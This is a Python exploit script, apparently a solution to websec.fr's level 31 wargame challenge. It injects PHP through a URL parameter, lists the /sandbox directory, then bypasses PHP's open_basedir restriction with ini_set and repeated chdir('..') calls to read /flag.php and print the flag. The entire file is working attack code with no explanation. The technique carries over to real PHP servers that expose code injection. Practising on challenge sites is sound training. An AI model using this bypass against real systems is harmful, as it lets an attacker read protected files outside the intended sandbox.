import requests

url = "http://websec.fr/level31/index.php?c="
Scandir = 'var_dump(scandir("/sandbox"));'
open_basedir_bypass = "ini_set('open_basedir','/sandbox');chdir('./tmp'); ini_set('open_basedir','..'); chdir('..'); chdir('..'); chdir('..'); chdir('..'); chdir('..'); chdir('..'); chdir('..'); chdir('..'); chdir('..'); chdir('..'); ini_set('open_basedir','/');var_dump(file_get_contents(\"/flag.php\"));"

def scandir():
	URL = url + Scandir
	res = requests.get(URL)
	print('[+] var_dump(scandir("/sandbox"));')
	print('>>> {}'.format(res.text))

def Exploit():
	URL = url + open_basedir_bypass
	res = requests.get(URL)
	FLAG = res.text.split('\'')
	print("[+] FALG : {}".format(FLAG[1]))

if __name__ == '__main__':
	print("[+] Start")
	scandir()
	Exploit()